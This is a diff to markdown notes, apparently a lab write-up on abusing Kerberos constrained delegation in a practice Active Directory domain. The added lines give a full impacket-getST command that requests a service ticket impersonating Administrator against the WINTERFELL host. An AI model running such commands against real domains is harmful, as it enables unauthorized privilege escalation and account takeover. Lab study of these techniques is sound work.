@@ -66,5 +66,17 @@ Ok so what are trying to do here ?
 
 To be precise we have `Constrained Delegation Privileges`.
   ![[images/2026-10-08_15-12-15.png]]
-So we want to ask the KDC 
+So we want to ask the KDC for a ST as the local admin of the machine and then use the ST to authenticate as the local admin.
   ![[images/2026-10-08_15-11-43.png]]
+We can see that the user of the `WINTERFELL` machine is `WINTERFELL$` so this is the account we want to take over.
+
+```bash
+  impacket-getST -spn CIFS/winterfell.north.sevenkingdoms.local \
+      -altservice HOST/winterfell.north.sevenkingdoms.local \
+      -impersonate Administrator \
+      north.sevenkingdoms.local/WINTERFELL$ \
+      -k -dc-ip 10.2.10.11
+```
+
+
+
